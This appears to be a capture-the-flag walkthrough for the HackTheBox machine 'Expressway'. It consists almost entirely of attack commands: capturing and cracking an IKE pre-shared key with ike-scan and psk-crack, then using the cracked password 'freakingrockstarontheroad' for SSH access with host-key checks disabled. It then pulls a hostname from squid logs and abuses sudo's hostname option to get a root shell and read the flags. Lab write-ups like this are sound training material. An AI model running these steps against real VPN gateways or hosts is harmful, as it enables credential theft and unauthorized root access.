# Expressway (GACHA Season 9)

```text
1. IKE Pre-Shared Key Cracking

   * Get the aggressive mode handshake and save the hash:

   1     ike-scan -A --id=vpn --pskcrack=psk.txt 10.10.11.87
   * Crack the hash using a wordlist:
   1     psk-crack -d /usr/share/wordlists/rockyou.txt psk.txt
      This revealed the PSK freakingrockstarontheroad and the username ike.

  2. Initial SSH Access

   * Log in as the ike user using the cracked password:

   1     export SSH_ASKPASS=/mnt/tmp/HTB/expressway/askpass.sh && setsid ssh -o 
     StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ike@10.10.11.87 "whoami"

  3. User Flag

   * Read the user flag from the home directory:

   1     export SSH_ASKPASS=/mnt/tmp/HTB/expressway/askpass.sh && setsid ssh -o 
     StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ike@10.10.11.87 "cat 
     /home/ike/user.txt"

  4. Privilege Escalation (Sudo Hostname Bypass)

   * Find the internal hostname by examining the squid logs:

   1     export SSH_ASKPASS=/mnt/tmp/HTB/expressway/askpass.sh && setsid ssh -o 
     StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ike@10.10.11.87 "cat 
     /var/log/squid/access.log.1"
      This revealed the hostname offramp.expressway.htb.
   * Use the discovered hostname to bypass the sudo restriction and get a root shell:

   1     export SSH_ASKPASS=/mnt/tmp/HTB/expressway/askpass.sh && setsid ssh -o 
     StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ike@10.10.11.87 "sudo -A 
     -h offramp.expressway.htb /bin/bash"

  5. Root Flag

   * Read the root flag from the /root directory:

   1     export SSH_ASKPASS=/mnt/tmp/HTB/expressway/askpass.sh && setsid ssh -o 
     StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ike@10.10.11.87 "sudo -A 
     -h offramp.expressway.htb cat /root/root.txt"

```
